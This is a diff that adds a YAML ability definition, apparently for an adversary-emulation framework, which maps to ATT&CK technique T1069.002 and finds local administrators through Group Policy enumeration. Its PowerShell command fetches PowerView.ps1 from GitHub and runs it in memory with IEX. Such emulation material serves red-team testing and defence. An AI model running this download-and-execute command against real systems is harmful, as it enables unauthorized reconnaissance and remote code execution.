@@ -1,0 +1,23 @@
+---
+- id: 03dd606e9400f00572fe7a965ee06d21
+  name: Find Local Admins via Group Policy (PowerView)
+  description: 'takes a computer and determines who has admin rights over it through
+    GPO enumeration. Upon execution, information about the machine will be displayed.
+
+    '
+  tactic: discovery
+  technique:
+    attack_id: T1069.002
+    name: 'Permission Groups Discovery: Domain Groups'
+  platforms:
+    windows:
+      psh:
+        command: '[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
+          IEX (IWR ''https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1''
+          -UseBasicParsing); Find-GPOComputerAdmin -ComputerName $env:COMPUTERNAME
+          -Verbose'
+        payloads: []
+        cleanup: ''
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
